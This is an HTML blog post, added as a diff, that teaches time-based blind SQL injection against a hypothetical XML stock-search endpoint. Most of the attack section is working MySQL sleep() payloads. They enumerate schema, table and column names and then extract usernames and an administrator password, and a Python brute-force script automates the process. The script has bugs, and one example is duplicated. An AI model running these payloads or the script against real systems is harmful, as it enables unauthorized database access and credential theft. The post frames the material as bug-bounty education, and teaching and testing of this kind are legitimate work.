@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Article Title - Kh40zz_Blog.sh</title>
+    <meta name="description" content="Reading article... Loading content...">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Courier+Prime:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <div class="header-content">
+                <h1 class="main-title">./Kh40zz_Blog.sh</h1>
+                <p class="subtitle">&gt; cat article.txt | less</p>
+                <p class="status">[STATUS] Article loaded successfully...</p>
+            </div>
+        </div>
+    </header>
+
+    <main class="main">
+        <div class="container">
+            <!-- Back Button -->
+            <section class="back-section">
+               <a href="/">
+                <button class="btn back-btn">
+                    $ cd ../
+                  </button>
+               </a>
+            </section>
+
+            <!-- Article Content -->
+            <article class="article-container">
+                <header class="article-header">
+                    <div class="article-meta">
+                        <div class="article-tags">
+                            <span class="tag">hacking_web</span>
+                            <span class="tag">sqli</span>
+                            <span class="tag">bug_bounty</span>
+                        </div>
+                        <span class="article-date">2025.08.30</span>
+                        <span class="read-time">9 minutes</span>
+                    </div>
+                    <h1 class="article-title">SQL Injection Time Based</h1>
+                    <p class="article-subtitle">In this Articule, we are going see how to exploit a SQLi with time delays, and we are going to see the impact that this vulnerability has in these days.</p>
+                </header>
+
+                <div class="article-content">
+                    <div class="terminal-box">
+                        <p>&gt; Executing articule.sql...</p>
+                        <p>&gt; Loading childhood data structures...</p>
+                        <p>&gt; Allocating memory for sqli time based...</p>
+                        <p>&gt; WARNING: Buffer overflow detected in lib.dll</p>
+                    </div>
+
+                    <div class="article-text">
+                       <h2>Introduction</h2>
+                       <p>The SQL Injection or <a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89 </a>  (Common Weakness Enumeration Format)  is a common vulnerability which affects databases in multiple services. It is made by bad sanitization or no sanitization in the user input when it makes a request to the databases. In now days it is in the top 3 in the <a href="https://owasp.org/www-project-top-ten/">OWASP TOP 10</a>, which means it is a pretty common vulnerability from websites.  This vulnerability has so many ways to be exploited and detected, but today I am going to teach how to exploit this vulnerability with a interesting way which use time delays and scripting with Python.</p>
+                
+<br><br>
+                    <h2>DISCLAIMER</h2>
+<br><br>
+                    <p>Warning: the following content contains hacking techniques. These techniques may be used for offensive cybersecurity services such as bug bounty, red teaming, pentesting, etc. The author of this blog intends to show how to detect this vulnerability for the aforementioned services. The author of this blog is not responsible for any consequences that may arise from the use of this knowledge. Remember that cybercrime carries serious legal penalties in many countries and territories.</p>
+                    <div class="image-container">
+                    <img src="/assets/svg/warning.svg" height="300px" width="400px" alt="Warning Symbol">
+                    </div>
+                    <h2>What is a SQL Injection?</h2>
+                    <p>SQL Injection is a common attack which the attacker can send more SQL command in a SQL Query by a bad sanitization in the user input, this allow  to the attacker read all the content of the databeses, incluiding passwords, emails, Credit Cards, etc. </p>
+                    
+                    <p>There are two types of SQLi: </p>
+
+                    <ol>
+                        &emsp;&emsp;<li><strong>Visible SQLi</strong>: The content of the database is showed in the web application </li>
+                        &emsp;&emsp;<li><strong>Blind SQLi</strong>: The content of the database is not showed in the web application</li>
+                    </ol>
+
+                    <p>In this articule we are to see  a way to exploit a  Blind SQLi since it is more difficult to know how to than the visible ones.</p>
+
+                    <div class="image-container">
+                       <img src="/assets/img/collection/2025/time_based_sqli/cwe89.png?height=300&width=500" alt="CWE-89 Diagram" class="article-image">
+                        <p>Image source: <a href="https://cwe.mitre.org/data/images/CWE-89-Diagram.png">https://cwe.mitre.org/data/images/CWE-89-Diagram.png</a></p>
+                    </div>
+
+                    <br><br>
+                    <h2>Blind SQLi</h2>
+<br><br>
+                    <p>As I explained before, Blind SQLi does not show the content of the databases, and that makes more harder to know the content of then, but it is not impossible to know, we can know the content of the databases in a pretty creative way, and this is by validations of characters, we can validate any character of the databases and their content and take advantage of the context of the service's environment to make these validations.</p>
+
+                    <p>
+Since any environment is a whole world, it is pretty different the way to exploit a Blind SQLi, but the idea is always the same: make validations. I am going to show how to make validations with time delays in the next section.</p>
+<br><br>
+                    <h3>Time Based SQLi</h3>
+                    <br>
+                    <p>Suppose we have a Web Application which is a virtual market, and we can search for different shops and their stocks. We can search all this by a HTTP Request which use the POST method to grep the content in a database:</p>
+    
+                    <div class="terminal-box">
+                        <p>
+                        POST /content/search/shops/london/383/stocks.php HTTP/1.1 <br>
+                        Host: target.com  <br>
+                        Content-Type: application/xml <br>
+                        Content-Length: 187 <br>
+
+                        &lt;?xml version="1.0" encoding="UTF-8"?&gt; <br>
+                        &emsp;&lt;StockRequest&gt;  <br>
+                        &emsp;&emsp;	&lt;Products&gt;  <br>
+                        &emsp;&emsp;&emsp;		&lt;ProductId&gt;892&lt;ProductId&gt; <br>
+                        &emsp;&emsp;	&lt;/Products&gt; <br>
+                        &emsp;&lt;/StockRequest&gt; <br>
+                        </p>
+
+                        </div>
+
+                        
+                <p>This Request sends a SQL request to the database to check the stock of a product, but the input of this request is not sanitized in the best way and it is possible to send another request inside of this one. Suppose  the Request is and the SQL language is MySQL:</p>
+
+                <div class="terminal-box">
+                <p>SELECT stock from products WHERE productId='&lt;INPUT&gt;' and realesed='1';</p>
+                </div>
+<br><br>
+                <h4>Exploiting</h4>
+<br><br>
+                <p>We can break this request with a ' and comment the rest of the query, so the rest will not be interpreted.</p>
+
+                <div class="terminal-box">
+                    <p>SELECT stock from products WHERE productId='892'-- -' and realesed='1';</p>
+                </div>
+
+                <p>
+Now that we can control the SQL request, we can check if we can use the <strong>sleep()</strong> function, this function will make a delay in the response, if the delay is, it means we can inject this function.</p>
+                </div>
+
+                <div class="terminal-box">
+                    &lt;?xml version="1.0" encoding="UTF-8"?&gt; <br>
+                &emsp;    &lt;StockRequest&gt;  <br>
+                &emsp;&emsp;    	&lt;Products&gt;  <br>
+                &emsp;&emsp;&emsp;    			&lt;ProductId&gt;892' and (select sleep(5))-- -&lt;ProductId&gt; <br>
+                &emsp;&emsp;    	&lt;/Products&gt; <br>
+                &emsp;    &lt;/StockRequest&gt; <br>
+                </div>
+
+                <p>Doing this, the website should wait 5 seconds to send the response, so we could now make the validations.</p>
+                <br><br>
+                <h3>Validations</h3>
+  <br><br>              
+                <p>The validations can be made by conditionals, and we can check which characters are with these conditionals, we cannot know the whole word, but we can check the characters one by one  until we get the full word. </p>
+                
+<br><br>
+                <h3>Get Length</h3>
+                <br>
+                <p>firstable we must know how many characters the content have, we can check them with the function <strong>length()</strong> in MySQL. We are going to check how many characters the first database has with time delays, so if the conditional is true, the response is going to have a delay of 3 seconds, if it is false, the response is not going to have any delay. Since the first database is always <strong>information_schema</strong>, this length will be 18:</p>
+                
+                <div class="terminal-box">
+                    &lt;?xml version="1.0" encoding="UTF-8"?&gt; <br>
+                 &emsp;   &lt;StockRequest&gt;  <br>
+                 &emsp;&emsp;   	&lt;Products&gt;  <br>
+                 &emsp;&emsp;&emsp;   			&lt;ProductId&gt;892' and (select case when length(SCHEMA_NAME)=18 then sleep(3) else 0 end as result from information_schema.schemata limit 1)-- -&lt;ProductId&gt; <br>
+                 &emsp;&emsp;   	&lt;/Products&gt; <br>
+                 &emsp;   &lt;/StockRequest&gt; <br>
+                </div>
+
+                <p>This will make a delay of 3 seconds, so it means it is true. now we can do it with the next database which we don't know:</p>
+
+                <div class="terminal-box">
+                    &lt;?xml version="1.0" encoding="UTF-8"?&gt; <br>
+                &emsp;    &lt;StockRequest&gt;  <br>
+                &emsp;&emsp;    	&lt;Products&gt;  <br>
+                &emsp;&emsp;&emsp;    			&lt;ProductId&gt;892' and (select case when length(SCHEMA_NAME)=12 then sleep(3) else 0 end as result from information_schema.schemata limit 1)-- -&lt;ProductId&gt; <br>
+                &emsp;&emsp;    	&lt;/Products&gt; <br>
+                &emsp;    &lt;/StockRequest&gt; <br>
+                </div>
+
+                <br><br>
+                <h3>Get Information</h3>
+                <br><br>
+                <p>Now that we can know the length of a database, we can try to enumerate all the characters of it with a script in python, so we can get all the databases, to then get all the tables of it, to then get the columns, and finally, the content.</p>
+
+
+                <br><br>
+                <h3>Get Databases</h3>
+                <br><br>
+                <p>To get the databases name, we have to first know the length of it, for example <strong>Information_schema</strong> has 18 characters, then we have to make a new query which make a new conditional, in this conditional we are going to compare if the character of the position <strong>x</strong>  is equal to the character <strong>y</strong> and if it is, the SQL's service has to make a delay, and if it is not equal, it must return a 0.</p>
+ 
+                <div class="terminal-box">
+                          &lt;?xml version="1.0" encoding="UTF-8"?&gt; <br>
+                &emsp;    &lt;StockRequest&gt;  <br>
+                &emsp;&emsp;    	&lt;Products&gt;  <br>
+                &emsp;&emsp;&emsp;    			&lt;ProductId&gt;892' and (select case when substring(SCHEMA_NAME,1,1)='i' then sleep(3) else 0 end as result from information_schema.schemata limit 1)-- -&lt;ProductId&gt; <br>
+                &emsp;&emsp;    	&lt;/Products&gt; <br>
+                &emsp;    &lt;/StockRequest&gt; <br>
+                </div>
+
+                <p>If the web site waits 3 seconds or more to show the response, it is because the first character is <strong>i</strong>, so we can try to get next other:</p>
+
+
+                <div class="terminal-box">
+                    &lt;?xml version="1.0" encoding="UTF-8"?&gt; <br>
+                &emsp;    &lt;StockRequest&gt;  <br>
+                &emsp;&emsp;    	&lt;Products&gt;  <br>
+                &emsp;&emsp;&emsp;    			&lt;ProductId&gt;892' and (select case when substring(SCHEMA_NAME,1,1)='i' then sleep(3) else 0 end as result from information_schema.schemata limit 1)-- -&lt;ProductId&gt; <br>
+                &emsp;&emsp;    	&lt;/Products&gt; <br>
+                &emsp;    &lt;/StockRequest&gt; <br>
+                </div>
+
+
+                <p>With this logic, we can automatize the process with a script in python, we can use the next modules:</p>
+                <div class="terminal-box">
+                requests <br>
+                time <br>
+                pwntools <br>
+                termcolor <br>
+                sys <br>
+                signal <br>
+                string <br>
+                </div>
+                    <p>And we can make the next exploit:</p>
+      <div class="terminal-box">
+<br>#!/usr/bin/env python 
+<br>
+<br>from pwn import * 
+<br>import requests 
+<br>import signal
+<br>import sys 
+<br>from termcolor import colored 
+<br>import string 
+<br>import time 
+<br>
+<br>target = "https://target.com/content/search/shops/london/383/stocks.php"
+<br>
+<br>def cancel(sig, frame):
+<br>&emsp;<br>	    print(colored("\n\n[!] Goodbye...\n", "red"))
+<br>&emsp;	    p1.failure(colored("Cancelled...", 'red'))
+<br>&emsp;	    p2.failure(colored("Cancelled...", 'red'))
+<br>&emsp;	    sys.exit(1)
+<br>
+<br>p1 = log.progress(colored(f"SQLi Attack", 'yellow'))
+<br>time.sleep(1.4)
+<br>p2 = log.progress(colored(f'Getting first database from {target}', 'yellow'))
+<br>p1.status(colored("Preparing...", 'white'))
+<br>p2.status(colored("Preparing...", 'white'))
+<br>time.sleep(1.2)
+<br>
+<br>p1.status(colored("Attacking...", 'red'))
+<br>p2.status(colored("Attacking...", 'red'))
+<br>
+<br>p3 = log.progress(colored("Attack", 'yellow'))
+<br>
+<br>p4 = log.progress(colored("Password", 'yellow'))
+<br>def sqli():
+<br>&emsp; 	    characters = string.ascii_lowercase + string.digits
+<br>&emsp;	    
+<br>&emsp;	    headers = {'Content-Type': 'application/xml'}
+<br>&emsp;	    
+<br>&emsp;	    password = ""
+<br>&emsp;	
+<br>&emsp;	    for position in range(1,19):
+<br>&emsp;&emsp;	        for char in characters:
+<br>&emsp;&emsp;&emsp;		
+<br>&emsp;&emsp;&emsp;	
+<br>&emsp;&emsp;&emsp;	        payload = f"892' and (select case when substring(SCHEMA_NAME,{position},1)='{char}' then sleep(3) else 0 end as result from information_schema.schemata limit 1)-- -"
+<br>&emsp;&emsp;&emsp;		        
+<br>&emsp;&emsp;&emsp;	            xml = f"&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;StockRequest&gt;&lt;Products&gt;&lt;ProductId&gt;{payload}&lt;/ProductId&gt;&lt;/Products&gt;&lt;/StockRequest&gt;"
+<br>&emsp;&emsp;&emsp;	           
+<br>&emsp;&emsp;&emsp;	            p3.status(colored(payload, 'red'))
+<br>&emsp;&emsp;&emsp;	            
+<br>&emsp;&emsp;&emsp;	            time_start = time.time()
+<br>&emsp;&emsp;&emsp;	            
+<br>&emsp;&emsp;&emsp;	            r = requests.get(target, data=xml, headers=headers)
+<br>&emsp;&emsp;&emsp;	            
+<br>&emsp;&emsp;&emsp;	            time_end = time.time()
+<br>&emsp;&emsp;&emsp;	            
+<br>&emsp;&emsp;&emsp;	            total_time = time_end - time_start 
+<br>&emsp;&emsp;&emsp;	            
+<br>&emsp;&emsp;&emsp;	            if total_time > 5:
+<br>&emsp;&emsp;&emsp;	            
+<br>&emsp;&emsp;&emsp;			    password += char
+<br>&emsp;&emsp;&emsp;		            
+<br>&emsp;&emsp;&emsp;			    p4.status(colored(password, 'green'))
+<br>&emsp;&emsp;&emsp;		            
+<br>&emsp;&emsp;&emsp;				break
+<br>&emsp;				
+<br>&emsp;	    p1.status(colored("Done!", 'green'))
+<br>&emsp;			    
+<br>&emsp;	    p2.status(colored("Done!", "green"))
+<br>				
+<br>if __name__ == '__main__':
+<br>				
+<br>&emsp;	    signal.signal(signal.SIGINT, cancel)
+<br>&emsp;	    sqli()
+
+        </div>
+        <p>This is going to show all the name of the first database, to get the second one, you can get the length of the second one moving the <strong>limit 1</strong> to <strong>limit 2</strong>  and put the position of <strong>substring(SCHEMA_NAME,1,1)</strong> to <strong>(SCHEMA_NAME,1,2)</strong>/strong>.</p>
+          
+        <h3>Get Tables</h3>
+        <p>Now we know the databases, we have to list for the tables in them, to do this, we have to do the same logic but just using tables from a database </p>
+
+        <h6>Length</h6>
+        <p>To get the length, we call to <strong>table_name</strong> from information_schema.tables and we try to make a conditional again:</p>
+        <h6>Length</h6>
+
+                        <div class="terminal-box">
+                      &lt;?xml version="1.0" encoding="UTF-8"?&gt; <br>
+                    &emsp;  &lt;StockRequest&gt;  <br>
+                    &emsp;&emsp;		&lt;Products&gt;  <br>
+                    &emsp;&emsp;&emsp;			&lt;ProductId&gt;892' and (select case when length(TABLE_NAME)=5 then sleep(3) else 0 end as result from information_schema.tables where table_schema='confidential' limit 1)-- -&lt;ProductId&gt; <br>
+                    &emsp;&emsp;		&lt;/Products&gt; <br>
+                    &emsp;	&lt;/StockRequest&gt; <br>
+                </div>
+
+            <h6>Get characters</h6>
+
+            <p>To get all the characters we use the same logic, but this time all implicated to the tables of the database:</p>
+                            <div class="terminal-box">
+                            &lt;?xml version="1.0" encoding="UTF-8"?&gt; <br>
+                            &emsp; &lt;StockRequest&gt;  <br>
+                            &emsp;&emsp;		&lt;Products&gt;  <br>
+                            &emsp;&emsp;&emsp;			&lt;ProductId&gt;892' and (select case when substring(TABLE_NAME,1,1)='u' then sleep(3) else 0 end as result from information_schema.tables where table_schema='confidential' limit 1)-- -&lt;ProductId&gt; <br>
+                            &emsp;&emsp;		&lt;/Products&gt; <br>
+                            &emsp;	&lt;/StockRequest&gt; <br>
+</div>
+
+<p>Then we can use our script in Python, but we just change the payload:</p>
+
+<div class="terminal-box">
+      payload = "892' and (select case when substring(TABLE_NAME,1,1)='u' then sleep(3) else 0 end as result from information_schema.tables where table_schema='confidential')-- -"
+</div>
+<br><br>
+<h3>Get Columns</h3>
+<br><br>
+<p>To get columns we have to do the same but now the columns, we change <strong>table_name</strong> to <strong>column_name</strong> and <strong>information_schema.tables</strong> to <strong>information_schema.columns</strong> and we add <strong> and where table_name='table'</strong> to search in our table.</p>
+    <h3>Length</h3>
+       <p>We are going to get the length of the first column with the same logic:</p>
+          
+                    <div class="terminal-box">
+                    &lt;?xml version="1.0" encoding="UTF-8"?&gt; <br>
+                    &emsp;&lt;StockRequest&gt;  <br>
+                	&emsp;&emsp;	&lt;Products&gt;  <br>
+                	&emsp;&emsp;&emsp;		&lt;ProductId&gt;892' and (select case when length(COLUMN_NAME)=4 then sleep(3) else 0 end as result from information_schema.columns where table_schema='confidential' and table_name='users' limit 1)-- -<br>
+                	&emsp;&emsp;	&lt;/Products&gt; <br>
+                	&emsp;&lt;/StockRequest&gt; <br>
+                </div>
+
+                <h6>Get characters</h6>
+                <p>Now we know the length, we can get the characters with the next query:</p>
+ 
+                          
+                    <div class="terminal-box">
+                    &lt;?xml version="1.0" encoding="UTF-8"?&gt; <br>
+                    &emsp;&lt;StockRequest&gt;  <br>
+                	&emsp;&emsp;	&lt;Products&gt;  <br>
+                	&emsp;&emsp;&emsp;		&lt;ProductId&gt;892' and (select case when substring(COLUMN_NAME,1,1)='u' then sleep(3) else 0 end as result from information_schema.columns where table_schema='confidential' and table_name='users')-- -<br>
+                	&emsp;&emsp;	&lt;/Products&gt; <br>
+                	&emsp;&lt;/StockRequest&gt; <br>
+                </div>
+ 
+                <p>And we can use the next payload in our script in Python:</p>
+ <div class="terminal-box">
+payload = "892' and (select case when substring(COLUMN_NAME,1,1)='u' then sleep(3) else 0 end as result from information_schema.columns where table_schema='confidential' and table_name='users')-- -"
+ </div>
+ <br><br>
+                <h6>Get content</h6>
+                <br><br>
+                <p>Finally, we can get the content from the columns. we are going to get the len of all the usernames firstable:</p>
+                <div class="terminal-box">
+                    &lt;?xml version="1.0" encoding="UTF-8"?&gt; <br>
+                    &emsp;&lt;StockRequest&gt;  <br>
+                	&emsp;&emsp;	&lt;Products&gt;  <br>
+                	&emsp;&emsp;&emsp;		&lt;ProductId&gt;892' and (select case when length(username)=13 then sleep(3) else 0 end as result from users where table_schema='confidential' and table_name='users')-- -<br>
+                	&emsp;&emsp;	&lt;/Products&gt; <br>
+                	&emsp;&lt;/StockRequest&gt; <br>
+                </div>
+                <p>Then we are going to get the character of them:</p>
+                <div class="terminal-box">
+                    &lt;?xml version="1.0" encoding="UTF-8"?&gt; <br>
+                    &emsp;&lt;StockRequest&gt;  <br>
+                	&emsp;&emsp;	&lt;Products&gt;  <br>
+                	&emsp;&emsp;&emsp;		&lt;ProductId&gt;892' and (select case when substring(username,1,1)='a' then sleep(3) else 0 end as result from users where table_schema='confidential' and table_name='users')-- -<br>
+                	&emsp;&emsp;	&lt;/Products&gt; <br>
+                	&emsp;&lt;/StockRequest&gt; <br>
+                </div>
+<br><br>
+                <h3>Length</h3>
+                <br><br>
+                <p>We first need to know the length of the password, we are going to use the same time delay validation:</p>
+
+                <div class="terminal-box">
+                    &lt;?xml version="1.0" encoding="UTF-8"?&gt; <br>
+                    &emsp;&lt;StockRequest&gt;  <br>
+                	&emsp;&emsp;	&lt;Products&gt;  <br>
+                	&emsp;&emsp;&emsp;		&lt;ProductId&gt;892' and (select case when length(password)=21 then sleep(3) else 0 end as result from users where table_schema='confidential' and table_name='users' and username='administrator')-- -<br>
+                	&emsp;&emsp;	&lt;/Products&gt; <br>
+                	&emsp;&lt;/StockRequest&gt; <br>
+                </div>
+<br><br>
+                <h3>characters</h3>
+<br><br>
+                <p>Now we know the length, we can get the characters of the password with time delays, remember we need the length to know until when we are going to get the characters in our script:</p>
+
+               
+                <div class="terminal-box">
+                    &lt;?xml version="1.0" encoding="UTF-8"?&gt; <br>
+                    &emsp;&lt;StockRequest&gt;  <br>
+                	&emsp;&emsp;	&lt;Products&gt;  <br>
+                	&emsp;&emsp;&emsp;		&lt;ProductId&gt;892' and (select case when substring(password,1,1)='h' then sleep(3) else 0 end as result from users where table_schema='confidential' and table_name='users' and username='administrator')-- -<br>
+                	&emsp;&emsp;	&lt;/Products&gt; <br>
+                	&emsp;&lt;/StockRequest&gt; <br>
+                </div>
+
+                <h2>Fun fact</h2>
+                <br><br>                
+                <p>To show that this vulnerability still be so important in our days, I am going to show the report to the DEFENSE DEPARTMENT OF US, this one is a Blind SQLi and a bug bounty hunter could detect it before than cybercriminals or another governments in 2024:</p>
+<br>
+                <a href="https://hackerone.com/reports/2759243">https://hackerone.com/reports/2759243</a>
+<br><br>
+                <h2>Conclusion</h2>
+<br><br>
+                <p>This vulnerability is quite common in our days and even important organizations can be affected by them, it is important sanitize any SQL query that you allow to the user send to the database, with some knowledge in SQL and scripting in Python or any other programming lenguage, you can exploit this vulnerability.</p>
+                <br><br><br>
+                <footer class="article-footer">
+                    <div class="article-navigation">
+                        <a href="/">
+                          <button  class="btn-ghost">
+                            &lt; Back to Terminal
+                          </button>
+                        </a>
+                        <div class="article-share">
+                            <span class="share-text">&gt; By Kh40zz</span>
+                        </div>
+                    </div>
+                </footer>
+            </article>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <p class="footer-text">
+            &gt; © 2025 https://kh40zz.github.io. All content rights reserved. <br> 
+            &gt; © 2025 https://kh40zz.github.io. Based on "Terminal Blog v1.0" by
+                <a href="https://nctnetwork.co.uk" target="_blank" rel="noopener noreferrer" class="footer-link">
+                    NCTNetwork
+                </a> <br>
+                &gt; @ 2025 Customized By <a href="https://github.com/kh40zz" rel="noopener noreferrer" class="footer-link">Kh40zz</a>
+            </p>
+        </div>
+    </footer>
+</body>
+</html>
